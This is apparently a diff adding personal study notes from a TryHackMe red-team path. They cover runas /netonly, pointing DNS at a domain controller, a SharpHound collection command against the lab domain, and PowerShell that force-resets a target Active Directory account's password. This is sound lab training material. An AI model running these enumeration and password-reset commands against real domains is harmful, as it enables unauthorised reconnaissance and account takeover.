@@ -1,0 +1,13 @@
+# note from redteam path in tryhackme
+
+/usr/lib/ruby/2.7.0/rubygems/
+/netonly - Since we are not domain-joined, we want to load the credentials for network authentication but not authenticate against a domain controller. So commands executed locally on the computer will run in the context of your standard Windows account, but any network connections will occur using the account specified here
+
+$dnsip = "<DC IP>"
+$index = Get-NetAdapter -Name 'Ethernet' | Select-Object -ExpandProperty 'ifIndex'
+Set-DnsClientServerAddress -InterfaceIndex $index -ServerAddresses $dnsip
+
+Sharphound.exe --CollectionMethods <Methods> --Domain za.tryhackme.com --ExcludeDCs
+
+$Password = ConvertTo-SecureString "New.Password.For.User" -AsPlainText -Force 
+Set-ADAccountPassword -Identity "AD.Account.Username.Of.Target" -Reset -NewPassword $Password
